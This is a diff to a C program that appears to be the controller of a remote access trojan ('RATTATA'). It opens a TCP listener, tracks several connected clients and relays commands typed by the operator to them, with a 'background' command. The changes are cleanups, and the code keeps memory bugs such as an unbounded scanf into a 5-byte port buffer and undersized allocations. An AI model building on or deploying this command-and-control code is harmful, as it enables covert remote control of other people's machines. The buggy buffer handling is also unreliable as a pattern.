@@ -22,7 +22,7 @@ typedef struct ClientInfo
 
 void init_client_thread(PTHREADDATA pclientdata);
 
-char PORT[3];
+char *PORT;
 PTHREADDATA pDataArray[MAX_CLIENTS];
 DWORD dwThreadIdArray[MAX_CLIENTS];
 HANDLE hThreadArray[MAX_CLIENTS];
@@ -31,31 +31,31 @@ PCLIENTINFO PClients[MAX_CLIENTS];
 
 int read_config()
 {
-    char *content = "PORT=8888";
-    char *file_name = "options.cfg";
-    char *readed = malloc(sizeof(char*));
+    // char *content = "PORT=8888";
+    // char *file_name = "options.cfg";
+    // char *readed = malloc(sizeof(char*));
 
-    FILE *fp;
-    fp = fopen(file_name, "r");
+    // FILE *fp;
+    // fp = fopen(file_name, "r");
 
-    if (fp == NULL)
-    {
-        fp = fopen(file_name, "w");
-        for (int i = 0; content[i] != '\0'; i++) {
-            fputc(content[i], fp);
-        }
-        fclose(fp);
-        return 0;
-    }
+    // if (fp == NULL)
+    // {
+    //     fp = fopen(file_name, "w");
+    //     for (int i = 0; content[i] != '\0'; i++) {
+    //         fputc(content[i], fp);
+    //     }
+    //     fclose(fp);
+    //     return 0;
+    // }
 
-    while ((content = fgetc(fp)) != EOF){
-        readed = realloc(readed, sizeof(char*));
-        // strcat(readed, (char*)content);
-        printf("%c", content);
-        char a[100];
-        strcat(a, content);
-        printf("%s", a);
-    }
+    // while ((content = fgetc(fp)) != EOF){
+    //     readed = realloc(readed, sizeof(char*));
+    //     // strcat(readed, (char*)content);
+    //     printf("%c", content);
+    //     char a[100];
+    //     strcat(a, content);
+    //     printf("%s", a);
+    // }
     // strcat(readed, "\0");
     // content[strlen(content)-1] = '\0';
     // printf("%d", strlen(content));
@@ -79,22 +79,21 @@ void logprint(char *type, char *message)
 SOCKET init_listener()
 {
     WSADATA wsaData;
-    int iResult;
     SOCKET ListenSocket = INVALID_SOCKET;
     struct addrinfo *result = NULL;
     struct addrinfo hints;
-    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
     ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
     hints.ai_flags = AI_PASSIVE;
-    iResult = getaddrinfo(NULL, PORT, &hints, &result);
+    getaddrinfo(NULL, PORT, &hints, &result);
     ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
 
-    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
+    bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
     freeaddrinfo(result);
-    iResult = listen(ListenSocket, SOMAXCONN);
+    listen(ListenSocket, SOMAXCONN);
 
     return ListenSocket;
 }
@@ -104,7 +103,6 @@ int link_client(CLIENTINFO *Client)
     int iResult;
     char recvbuf[DEFAULT_BUFLEN];
     int recvbuflen = DEFAULT_BUFLEN;
-    int iSendResult;
     int id = Client->id;
     for (;;)
     {
@@ -117,12 +115,12 @@ int link_client(CLIENTINFO *Client)
             fgets(recvbuf, 4096, stdin);
             if (strcmp(recvbuf, "background") == 10)
             {
-                iSendResult = send(Client->Socket, "", 2, 0);
+                send(Client->Socket, "", 2, 0);
                 memset(recvbuf, 0, 4096);
                 recvbuf[0] = '\0';
                 break;
             }
-            iSendResult = send(Client->Socket, recvbuf, strlen(recvbuf), 0);
+            send(Client->Socket, recvbuf, strlen(recvbuf), 0);
             memset(recvbuf, 0, 4096);
             recvbuf[0] = '\0';
         }
@@ -139,6 +137,7 @@ int link_client(CLIENTINFO *Client)
             return 0;
         }
     }
+    return 0;
 }
 
 DWORD WINAPI init_client(LPVOID lpParam)
@@ -169,6 +168,8 @@ DWORD WINAPI init_client(LPVOID lpParam)
             break;
         }
     }
+    
+    return 0;
 }
 
 void init_client_thread(PTHREADDATA pclientdata)
@@ -185,17 +186,16 @@ void init_client_thread(PTHREADDATA pclientdata)
     printf("\n!!!!!!! %d !!!!!!!\n", threadNbr);
 }
 
-int menu()
+void menu()
 {
     int choice = 0;
-    int dummy = 0;
     printf("RATTATA >>\n");
     printf("1 - Start a new server.\n2 - View clients\n3 - Exit\nEnter choice : ");
     scanf("%d", &choice);
     if (choice == 1)
     {
         printf("Listening PORT : ");
-        scanf("%s", &PORT);
+        scanf("%s", PORT);
         SOCKET listener = init_listener();
         pDataArray[threadNbr] = (PTHREADDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PTHREADDATA));
         if (pDataArray[threadNbr] == NULL)
@@ -240,6 +240,7 @@ int menu()
 int main(void)
 {
     //read_config();
+    PORT = malloc(5*sizeof(char));
     for (int i = 1; i < MAX_CLIENTS; i++)
     {
         PClients[i] = malloc(sizeof(PCLIENTINFO));
